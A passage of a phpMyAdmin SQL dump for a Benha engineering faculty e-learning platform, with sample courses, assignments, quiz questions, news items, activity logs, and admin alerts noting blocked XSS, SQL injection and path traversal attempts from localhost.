-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jun 15, 2026 at 05:51 AM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `benha_engineering`
--

-- --------------------------------------------------------

--
-- Table structure for table `activity_logs`
--

CREATE TABLE `activity_logs` (
  `id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `action` varchar(100) NOT NULL,
  `entity_type` varchar(50) DEFAULT NULL,
  `entity_id` int(11) DEFAULT NULL,
  `description` text DEFAULT NULL,
  `ip_address` varchar(45) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `activity_logs`
--

INSERT INTO `activity_logs` (`id`, `user_id`, `action`, `entity_type`, `entity_id`, `description`, `ip_address`, `created_at`) VALUES
(1, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 08:00:00'),
(2, 2, 'login', 'user', 2, 'User doctor logged in.', '::1', '2026-06-14 08:05:00'),
(3, 3, 'login', 'user', 3, 'User ta logged in.', '::1', '2026-06-14 08:10:00'),
(4, 4, 'login', 'user', 4, 'User student logged in.', '::1', '2026-06-14 08:15:00'),
(5, 2, 'course_created', 'course', 1, 'Created course: CSE101', '::1', '2026-06-14 08:20:00'),
(6, 2, 'course_created', 'course', 2, 'Created course: CSE201', '::1', '2026-06-14 08:21:00'),
(7, 2, 'quiz_created', 'quiz', 1, 'Created quiz: Week 1-3 Assessment', '::1', '2026-06-14 08:30:00'),
(8, 2, 'question_added', 'question', 1, 'Added question to quiz 1', '::1', '2026-06-14 08:31:00'),
(9, 2, 'assignment_created', 'assignment', 1, 'Created assignment: Programming Assignment #1', '::1', '2026-06-14 08:40:00'),
(10, 4, 'assignment_submitted', 'assignment_submission', 1, 'Submitted assignment 1', '::1', '2026-06-14 09:00:00'),
(11, 4, 'quiz_attempted', 'quiz_attempt', 1, 'Student attempted quiz 1', '::1', '2026-06-14 09:30:00'),
(12, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 10:00:00'),
(13, 2, 'logout', 'user', 2, 'User doctor logged out.', '::1', '2026-06-14 12:29:41'),
(14, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 12:29:46'),
(15, 1, 'user_suspended', 'user', 5, 'Deactivated user ID: 5', '::1', '2026-06-14 12:30:08'),
(16, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 12:30:50'),
(17, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 12:30:59'),
(18, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 12:31:20'),
(19, 2, 'login', 'user', 2, 'User doctor logged in.', '::1', '2026-06-14 12:31:26'),
(20, 2, 'logout', 'user', 2, 'User doctor logged out.', '::1', '2026-06-14 12:31:45'),
(21, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 12:31:49'),
(22, 1, 'user_updated', 'user', 5, 'Updated user ID: 5', '::1', '2026-06-14 12:32:44'),
(23, 1, 'user_updated', 'user', 5, 'Updated user ID: 5', '::1', '2026-06-14 12:33:02'),
(24, 1, 'course_updated', 'course', 1, 'Updated course ID: 1', '::1', '2026-06-14 12:57:34'),
(25, 1, 'user_created', 'user', 6, 'Created user: Ebrahim Salah', '::1', '2026-06-14 12:59:20'),
(26, 1, 'course_created', 'course', 9, 'Created course: CSE222', '::1', '2026-06-14 13:02:44'),
(27, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 13:33:10'),
(28, 2, 'login', 'user', 2, 'User doctor logged in.', '::1', '2026-06-14 13:33:16'),
(29, 2, 'logout', 'user', 2, 'User doctor logged out.', '::1', '2026-06-14 13:33:22'),
(30, 2, 'login', 'user', 2, 'User doctor logged in.', '::1', '2026-06-14 13:33:24'),
(31, 2, 'assignment_created', 'assignment', 5, 'Created assignment: programming assignment2', '::1', '2026-06-14 13:34:15'),
(32, 2, 'logout', 'user', 2, 'User doctor logged out.', '::1', '2026-06-14 13:34:40'),
(33, 4, 'login', 'user', 4, 'User student logged in.', '::1', '2026-06-14 13:34:44'),
(34, 4, 'logout', 'user', 4, 'User student logged out.', '::1', '2026-06-14 13:37:17'),
(35, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 13:37:22'),
(36, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 15:35:41'),
(37, 2, 'login', 'user', 2, 'User doctor logged in.', '::1', '2026-06-14 15:35:49'),
(38, 2, 'logout', 'user', 2, 'User doctor logged out.', '::1', '2026-06-14 15:56:08'),
(39, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 15:56:17'),
(40, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 16:06:46'),
(41, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 16:06:52'),
(42, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 16:06:59'),
(43, 4, 'login', 'user', 4, 'User student logged in.', '::1', '2026-06-14 16:07:04'),
(44, 4, 'logout', 'user', 4, 'User student logged out.', '::1', '2026-06-14 16:07:26'),
(45, 2, 'login', 'user', 2, 'User doctor logged in.', '::1', '2026-06-14 16:07:32'),
(46, 2, 'assignment_deleted', 'assignment', 5, 'Deleted assignment ID: 5', '::1', '2026-06-14 16:07:42'),
(47, 2, 'logout', 'user', 2, 'User doctor logged out.', '::1', '2026-06-14 16:08:34'),
(48, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 16:11:26'),
(49, 1, 'logout', 'user', 1, 'User admin logged out.', '::1', '2026-06-14 16:11:40'),
(50, 1, 'login', 'user', 1, 'User admin logged in.', '::1', '2026-06-14 16:16:47');

-- --------------------------------------------------------

--
-- Table structure for table `assignments`
--

CREATE TABLE `assignments` (
  `id` int(11) NOT NULL,
  `course_id` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `description` text DEFAULT NULL,
  `instructions` text DEFAULT NULL,
  `max_file_size_mb` int(11) DEFAULT 10,
  `allowed_file_types` varchar(255) DEFAULT 'pdf,zip,doc,docx',
  `max_marks` decimal(10,2) NOT NULL DEFAULT 100.00,
  `deadline` datetime NOT NULL,
  `late_submission_allowed` tinyint(1) DEFAULT 0,
  `late_penalty_percent` decimal(5,2) DEFAULT 0.00,
  `is_published` tinyint(1) DEFAULT 0,
  `created_by` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `assignments`
--

INSERT INTO `assignments` (`id`, `course_id`, `title`, `description`, `instructions`, `max_file_size_mb`, `allowed_file_types`, `max_marks`, `deadline`, `late_submission_allowed`, `late_penalty_percent`, `is_published`, `created_by`, `created_at`, `updated_at`) VALUES
(1, 1, 'Programming Assignment #1', 'Write a C program to implement basic sorting algorithms including Bubble Sort, Selection Sort, and Insertion Sort.', 'Submit a ZIP file containing your source code (.c files) and a brief PDF report explaining your approach and complexity analysis.', 10, 'pdf,zip,doc,docx', 100.00, '2026-06-20 23:59:59', 1, 10.00, 1, 2, '2026-06-14 08:40:00', '2026-06-14 08:40:00'),
(2, 2, 'Data Structures Project', 'Implement a doubly linked list with insertion, deletion, traversal, and search operations.', 'Submit your code as a ZIP file. Include comments, documentation, and a README file.', 10, 'pdf,zip,doc,docx', 100.00, '2026-06-25 23:59:59', 1, 15.00, 1, 2, '2026-06-14 08:45:00', '2026-06-14 08:45:00'),
(3, 3, 'Database Design Project', 'Design an ER diagram for a university library management system with at least 5 entities.', 'Submit a PDF with the ER diagram, relational schema, and SQL CREATE TABLE statements.', 10, 'pdf,zip,doc,docx', 50.00, '2026-06-30 23:59:59', 0, 0.00, 1, 2, '2026-06-14 08:50:00', '2026-06-14 08:50:00'),
(4, 1, 'Algorithm Analysis Assignment', 'Analyze the time and space complexity of Merge Sort, Quick Sort, and Heap Sort.', 'Submit a PDF report with mathematical proofs and comparison tables.', 10, 'pdf,zip,doc,docx', 75.00, '2026-07-05 23:59:59', 1, 20.00, 0, 2, '2026-06-14 09:00:00', '2026-06-14 09:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `assignment_files`
--

CREATE TABLE `assignment_files` (
  `id` int(11) NOT NULL,
  `assignment_id` int(11) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `file_path` varchar(500) NOT NULL,
  `file_size` int(11) NOT NULL,
  `file_type` varchar(50) NOT NULL,
  `uploaded_by` int(11) NOT NULL,
  `uploaded_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `assignment_files`
--

INSERT INTO `assignment_files` (`id`, `assignment_id`, `file_name`, `file_path`, `file_size`, `file_type`, `uploaded_by`, `uploaded_at`) VALUES
(1, 1, 'assignment1_template.zip', 'uploads/assignments/1/template.zip', 2048000, 'application/zip', 2, '2026-06-14 08:41:00'),
(2, 1, 'sorting_algorithms_reference.pdf', 'uploads/assignments/1/reference.pdf', 1536000, 'application/pdf', 2, '2026-06-14 08:42:00'),
(3, 2, 'linked_list_guide.pdf', 'uploads/assignments/2/guide.pdf', 1024000, 'application/pdf', 2, '2026-06-14 08:46:00'),
(4, 3, 'er_diagram_example.pdf', 'uploads/assignments/3/example.pdf', 2560000, 'application/pdf', 2, '2026-06-14 08:51:00');

-- --------------------------------------------------------

--
-- Table structure for table `assignment_submissions`
--

CREATE TABLE `assignment_submissions` (
  `id` int(11) NOT NULL,
  `assignment_id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `file_name` varchar(255) DEFAULT NULL,
  `file_path` varchar(500) DEFAULT NULL,
  `file_size` int(11) DEFAULT NULL,
  `file_type` varchar(50) DEFAULT NULL,
  `submission_text` text DEFAULT NULL,
  `submitted_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `is_late` tinyint(1) DEFAULT 0,
  `marks_obtained` decimal(10,2) DEFAULT NULL,
  `feedback` text DEFAULT NULL,
  `graded_by` int(11) DEFAULT NULL,
  `graded_at` datetime DEFAULT NULL,
  `status` enum('submitted','graded','returned') DEFAULT 'submitted'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `assignment_submissions`
--

INSERT INTO `assignment_submissions` (`id`, `assignment_id`, `student_id`, `file_name`, `file_path`, `file_size`, `file_type`, `submission_text`, `submitted_at`, `is_late`, `marks_obtained`, `feedback`, `graded_by`, `graded_at`, `status`) VALUES
(1, 1, 4, 'sorting_assignment_student.zip', 'uploads/submissions/1/student_4_sorting.zip', 1536000, 'application/zip', NULL, '2026-06-15 10:30:00', 0, 85.50, 'Good implementation. Consider optimizing Bubble Sort with a flag to detect already sorted arrays.', 2, '2026-06-16 14:00:00', 'graded'),
(2, 2, 4, 'linked_list_project.zip', 'uploads/submissions/2/student_4_linkedlist.zip', 2048000, 'application/zip', NULL, '2026-06-18 09:15:00', 0, NULL, NULL, NULL, NULL, 'submitted');

-- --------------------------------------------------------

--
-- Table structure for table `courses`
--

CREATE TABLE `courses` (
  `id` int(11) NOT NULL,
  `course_code` varchar(20) NOT NULL,
  `course_name` varchar(200) NOT NULL,
  `description` text DEFAULT NULL,
  `department` varchar(100) NOT NULL,
  `semester` varchar(20) NOT NULL,
  `year` int(11) NOT NULL,
  `credit_hours` int(11) DEFAULT 3,
  `is_active` tinyint(1) DEFAULT 1,
  `created_by` int(11) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `courses`
--

INSERT INTO `courses` (`id`, `course_code`, `course_name`, `description`, `department`, `semester`, `year`, `credit_hours`, `is_active`, `created_by`, `created_at`, `updated_at`) VALUES
(1, 'CSE101', 'Introduction to Computer Science', 'Fundamentals of computer science including algorithms, data structures, programming basics, and problem-solving techniques using C language.', 'Computer Engineering', 'First', 1, 4, 1, 2, '2026-06-14 08:20:00', '2026-06-14 12:57:34'),
(2, 'CSE201', 'Data Structures & Algorithms', 'Advanced data structures including trees, graphs, hash tables, and algorithm design techniques such as divide and conquer, dynamic programming, and greedy algorithms.', 'Computer Engineering', 'Second', 2, 3, 1, 2, '2026-06-14 08:21:00', '2026-06-14 08:21:00'),
(3, 'CSE301', 'Database Systems', 'Relational database design, normalization, SQL, transaction management, and introduction to NoSQL databases.', 'Computer Engineering', 'First', 3, 3, 1, 2, '2026-06-14 08:22:00', '2026-06-14 08:22:00'),
(4, 'CSE302', 'Software Engineering', 'Software development lifecycle, agile methodologies, design patterns, UML modeling, and project management.', 'Computer Engineering', 'Second', 3, 3, 1, 2, '2026-06-14 08:23:00', '2026-06-14 08:23:00'),
(5, 'CSE401', 'Artificial Intelligence', 'Machine learning fundamentals, neural networks, natural language processing, and intelligent systems design.', 'Computer Engineering', 'First', 4, 3, 1, 2, '2026-06-14 08:24:00', '2026-06-14 08:24:00'),
(6, 'ECE201', 'Digital Logic Design', 'Boolean algebra, combinational and sequential logic circuits, flip-flops, registers, and counters.', 'Electrical Engineering', 'First', 2, 4, 1, 2, '2026-06-14 08:25:00', '2026-06-14 08:25:00'),
(7, 'CSE205', 'Object-Oriented Programming', 'Principles of OOP using Java: classes, objects, inheritance, polymorphism, encapsulation, and exception handling.', 'Computer Engineering', 'First', 2, 3, 1, 2, '2026-06-14 08:26:00', '2026-06-14 08:26:00'),
(8, 'CSE303', 'Computer Networks', 'OSI model, TCP/IP protocol suite, routing algorithms, network security, and wireless networks.', 'Computer Engineering', 'Second', 3, 3, 1, 2, '2026-06-14 08:27:00', '2026-06-14 08:27:00');

-- --------------------------------------------------------

--
-- Table structure for table `course_doctors`
--

CREATE TABLE `course_doctors` (
  `id` int(11) NOT NULL,
  `course_id` int(11) NOT NULL,
  `doctor_id` int(11) NOT NULL,
  `assigned_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `course_doctors`
--

INSERT INTO `course_doctors` (`id`, `course_id`, `doctor_id`, `assigned_at`) VALUES
(1, 1, 2, '2026-06-14 08:20:00'),
(2, 2, 2, '2026-06-14 08:21:00'),
(3, 3, 2, '2026-06-14 08:22:00'),
(4, 4, 2, '2026-06-14 08:23:00'),
(5, 5, 2, '2026-06-14 08:24:00'),
(6, 6, 2, '2026-06-14 08:25:00'),
(7, 7, 2, '2026-06-14 08:26:00'),
(8, 8, 2, '2026-06-14 08:27:00');

-- --------------------------------------------------------

--
-- Table structure for table `course_enrollments`
--

CREATE TABLE `course_enrollments` (
  `id` int(11) NOT NULL,
  `course_id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `enrolled_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `status` enum('active','dropped','completed') DEFAULT 'active'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `course_enrollments`
--

INSERT INTO `course_enrollments` (`id`, `course_id`, `student_id`, `enrolled_at`, `status`) VALUES
(1, 1, 4, '2026-06-14 08:15:00', 'active'),
(2, 2, 4, '2026-06-14 08:15:30', 'active'),
(3, 3, 4, '2026-06-14 08:16:00', 'active'),
(4, 4, 4, '2026-06-14 08:16:30', 'active');

-- --------------------------------------------------------

--
-- Table structure for table `course_tas`
--

CREATE TABLE `course_tas` (
  `id` int(11) NOT NULL,
  `course_id` int(11) NOT NULL,
  `ta_id` int(11) NOT NULL,
  `assigned_by` int(11) NOT NULL,
  `assigned_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `course_tas`
--

INSERT INTO `course_tas` (`id`, `course_id`, `ta_id`, `assigned_by`, `assigned_at`) VALUES
(1, 1, 3, 2, '2026-06-14 08:20:00'),
(2, 2, 3, 2, '2026-06-14 08:21:00'),
(3, 3, 3, 2, '2026-06-14 08:22:00'),
(4, 4, 3, 2, '2026-06-14 08:23:00');

-- --------------------------------------------------------

--
-- Table structure for table `csrf_tokens`
--

CREATE TABLE `csrf_tokens` (
  `id` int(11) NOT NULL,
  `session_id` varchar(255) NOT NULL,
  `token` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `expires_at` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `news`
--

CREATE TABLE `news` (
  `id` int(11) NOT NULL,
  `title` varchar(200) NOT NULL,
  `content` text NOT NULL,
  `image_url` varchar(255) DEFAULT NULL,
  `category` varchar(50) DEFAULT 'general',
  `is_published` tinyint(1) DEFAULT 1,
  `published_by` int(11) NOT NULL,
  `published_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `news`
--

INSERT INTO `news` (`id`, `title`, `content`, `image_url`, `category`, `is_published`, `published_by`, `published_at`) VALUES
(1, 'Welcome to the New E-Learning Platform', 'The Faculty of Engineering at Shubra is proud to launch its new digital learning platform. This system will streamline academic assessments, quiz management, and foster collaboration between faculty and students.', NULL, 'announcement', 1, 1, '2026-06-14 07:00:00'),
(2, 'Midterm Examination Schedule Released', 'The midterm examination schedule for the Summer 2026 semester has been published. Please check your course dashboards for specific dates and times.', NULL, 'academic', 1, 1, '2026-06-14 07:05:00'),
(3, 'Research Symposium 2026', 'Join us for the annual Research Symposium showcasing innovative projects from our engineering students. Prizes will be awarded to the top three presentations.', NULL, 'event', 1, 1, '2026-06-14 07:10:00'),
(4, 'New Computer Lab Opening', 'A state-of-the-art computer laboratory has been inaugurated in Building C, featuring the latest hardware and software for engineering simulations.', NULL, 'campus', 1, 1, '2026-06-14 07:15:00'),
(5, 'Summer Training Program', 'Applications are now open for the summer training program with industry partners. Gain real-world experience in your field of study.', NULL, 'opportunity', 1, 1, '2026-06-14 07:20:00'),
(6, 'Library Extended Hours', 'The faculty library will now operate until midnight during exam periods to accommodate student study schedules.', NULL, 'announcement', 1, 1, '2026-06-14 07:25:00'),
(7, 'Important: System Maintenance', 'The e-learning platform will undergo scheduled maintenance on June 20, 2026 from 2:00 AM to 4:00 AM. Please save your work accordingly.', NULL, 'announcement', 1, 1, '2026-06-14 07:30:00');

-- --------------------------------------------------------

--
-- Table structure for table `notifications`
--

CREATE TABLE `notifications` (
  `id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `role_target` varchar(50) DEFAULT NULL,
  `type` varchar(50) NOT NULL,
  `title` varchar(255) NOT NULL,
  `message` text NOT NULL,
  `is_read` tinyint(1) DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `notifications`
--

INSERT INTO `notifications` (`id`, `user_id`, `role_target`, `type`, `title`, `message`, `is_read`, `created_at`) VALUES
(1, NULL, 'student', 'course_announcement', '📘 New Course Available', 'Course (CSE101 - Introduction to Computer Science) has been added to the Computer Engineering department.', 0, '2026-06-14 08:20:00'),
(2, NULL, 'student', 'course_announcement', '📘 New Course Available', 'Course (CSE201 - Data Structures & Algorithms) has been added to the Computer Engineering department.', 0, '2026-06-14 08:21:00'),
(3, NULL, 'student', 'assignment', '📝 New Assignment Posted', 'Dr. Ahmed Hassan posted a new assignment: \"Programming Assignment #1\" in CSE101. Due: June 20, 2026.', 0, '2026-06-14 08:40:00'),
(4, NULL, 'student', 'quiz', '📝 New Quiz Available', 'Dr. Ahmed Hassan posted a new quiz: \"Week 1-3 Assessment\" in CSE101. Duration: 30 minutes.', 0, '2026-06-14 08:30:00'),
(5, 2, 'doctor', 'assignment_submission', '📤 Assignment Submitted', 'Student (Mostafa Sayed) submitted a solution for \"Programming Assignment #1\".', 1, '2026-06-15 10:30:00'),
(6, 2, 'doctor', 'assignment_submission', '📤 Assignment Submitted', 'Student (test admin) submitted a solution for \"Programming Assignment #1\".', 1, '2026-06-16 08:00:00'),
(7, NULL, 'student', 'announcement', '📢 System Maintenance Notice', 'The platform will be under maintenance on June 20, 2026 from 2:00 AM to 4:00 AM.', 0, '2026-06-14 07:30:00'),
(8, 4, 'student', 'grade', '📊 Grade Updated', 'Your assignment \"Programming Assignment #1\" has been graded. You scored 85.50/100.', 0, '2026-06-16 14:00:00'),
(9, 5, 'student', 'grade', '📊 Grade Updated', 'Your assignment \"Programming Assignment #1\" has been graded. You scored 78.00/100.', 0, '2026-06-17 10:00:00'),
(10, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 12:35:40'),
(11, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 12:35:47'),
(12, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 12:35:51'),
(13, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 12:56:54'),
(14, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 12:57:03'),
(15, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 12:57:23'),
(16, NULL, 'student', 'course_announcement', '📘 New Course Available', 'Course (CSE222 - sss) has been added to the Computer Engineering department.', 0, '2026-06-14 13:02:44'),
(17, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a Path Traversal attempt from IP ::1', 0, '2026-06-14 13:05:26'),
(18, NULL, 'student', 'assignment', '📚 New Assignment Posted', 'A new assignment has been uploaded: \"programming assignment2\". Check the deadline.', 0, '2026-06-14 13:34:15'),
(19, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:32:35'),
(20, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:32:48'),
(21, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:32:59'),
(22, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:35:01'),
(23, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:36:23'),
(24, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:36:34'),
(25, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:46:03'),
(26, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 15:56:45'),
(27, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a SQL Injection attempt from IP ::1', 0, '2026-06-14 16:14:44'),
(28, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a SQL Injection attempt from IP ::1', 0, '2026-06-14 16:15:27'),
(29, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a SQL Injection attempt from IP ::1', 0, '2026-06-14 16:16:12'),
(30, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a SQL Injection attempt from IP ::1', 0, '2026-06-14 16:16:34'),
(31, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a SQL Injection attempt from IP ::1', 0, '2026-06-14 16:16:40'),
(32, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 16:17:24'),
(33, NULL, 'admin', 'security', '🚨 New Attack Blocked', 'Blocked a XSS attempt from IP ::1', 0, '2026-06-14 16:17:38');

-- --------------------------------------------------------

--
-- Table structure for table `questions`
--

CREATE TABLE `questions` (
  `id` int(11) NOT NULL,
  `quiz_id` int(11) NOT NULL,
  `question_text` text NOT NULL,
  `question_type` enum('mcq','true_false') NOT NULL,
  `marks` decimal(5,2) NOT NULL DEFAULT 1.00,
  `correct_answer` text NOT NULL,
  `explanation` text DEFAULT NULL,
  `question_order` int(11) DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `questions`
--

INSERT INTO `questions` (`id`, `quiz_id`, `question_text`, `question_type`, `marks`, `correct_answer`, `explanation`, `question_order`, `created_at`) VALUES
(1, 1, 'What does CPU stand for?', 'mcq', 2.00, 'Central Processing Unit', 'The CPU is the primary component of a computer that performs most of the processing inside a computer.', 1, '2026-06-14 08:31:00'),
(2, 1, 'Which of the following is a programming language?', 'mcq', 2.00, 'Python', 'Python is a high-level, interpreted programming language known for its readability and versatility.', 2, '2026-06-14 08:31:00'),
(3, 1, 'The binary system uses base-2 notation.', 'true_false', 2.00, 'True', 'Binary is a base-2 number system that uses only two digits: 0 and 1.', 3, '2026-06-14 08:31:00'),
(4, 1, 'What is the time complexity of binary search?', 'mcq', 2.00, 'O(log n)', 'Binary search divides the search interval in half each time, resulting in logarithmic time complexity.', 4, '2026-06-14 08:31:00'),
(5, 1, 'RAM is a type of volatile memory.', 'true_false', 2.00, 'True', 'RAM (Random Access Memory) is volatile, meaning it loses its contents when power is turned off.', 5, '2026-06-14 08:31:00'),
(6, 2, 'Which data structure uses LIFO (Last In First Out) principle?', 'mcq', 3.00, 'Stack', 'A stack follows the LIFO principle where the last element added is the first one to be removed.', 1, '2026-06-14 08:35:00'),
(7, 2, 'What is the time complexity of accessing an element in an array by index?', 'mcq', 3.00, 'O(1)', 'Arrays provide constant time O(1) access to elements using their index.', 2, '2026-06-14 08:35:00'),
(8, 2, 'A linked list requires contiguous memory allocation.', 'true_false', 3.00, 'False', 'Unlike arrays, linked lists do not require contiguous memory allocation. Each node points to the next node.', 3, '2026-06-14 08:35:00'),
(9, 2, 'Which sorting algorithm has the best average-case time complexity?', 'mcq', 3.00, 'Merge Sort', 'Merge Sort has an average-case time complexity of O(n log n), which is optimal for comparison-based sorting.', 4, '2026-06-14 08:35:00'),
(10, 2, 'A queue follows the FIFO principle.', 'true_false', 3.00, 'True', 'Queue follows First In First Out (FIFO) principle where the first element added is the first one to be removed.', 5, '2026-06-14 08:35:00'),
(11, 3, 'Which SQL command is used to retrieve data from a database?', 'mcq', 2.50, 'SELECT', 'The SELECT statement is used to query the database and retrieve data matching specific criteria.', 1, '2026-06-14 08:38:00'),
(12, 3, 'In a relational database, a table is also called a relation.', 'true_false', 2.50, 'True', 'In relational database terminology, a table is indeed called a relation.', 2, '2026-06-14 08:38:00'),
(13, 3, 'Which normal form eliminates transitive dependencies?', 'mcq', 2.50, 'Third Normal Form (3NF)', 'Third Normal Form (3NF) eliminates transitive dependencies, ensuring that non-key attributes depend only on the primary key.', 3, '2026-06-14 08:38:00'),
(14, 3, 'ACID properties in databases stand for Atomicity, Consistency, Isolation, and Durability.', 'true_false', 2.50, 'True', 'ACID properties ensure reliable processing of database transactions.', 4, '2026-06-14 08:38:00');

-- --------------------------------------------------------

--
-- Table structure for table `question_options`
--

CREATE TABLE `question_options` (
  `id` int(11) NOT NULL,
  `question_id` int(11) NOT NULL,
  `option_text` text NOT NULL,
  `is_correct` tinyint(1) DEFAULT 0,
  `option_order` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `question_options`
--

INSERT INTO `question_options` (`id`, `question_id`, `option_text`, `is_correct`, `option_order`) VALUES
(1, 1, 'Central Processing Unit', 1, 1),
(2, 1, 'Computer Personal Unit', 0, 2),
(3, 1, 'Central Processor Unit', 0, 3),
(4, 1, 'Central Process Unit', 0, 4),
(5, 2, 'HTML', 0, 1),
(6, 2, 'Python', 1, 2),
(7, 2, 'HTTP', 0, 3),
(8, 2, 'URL', 0, 4),
(9, 3, 'True', 1, 1),
(10, 3, 'False', 0, 2),
(11, 4, 'O(n)', 0, 1),
(12, 4, 'O(log n)', 1, 2),
(13, 4, 'O(n^2)', 0, 3),
(14, 4, 'O(1)', 0, 4),
(15, 5, 'True', 1, 1),
(16, 5, 'False', 0, 2),
(17, 6, 'Queue', 0, 1),
(18, 6, 'Stack', 1, 2),
(19, 6, 'Array', 0, 3),
(20, 6, 'Linked List', 0, 4),
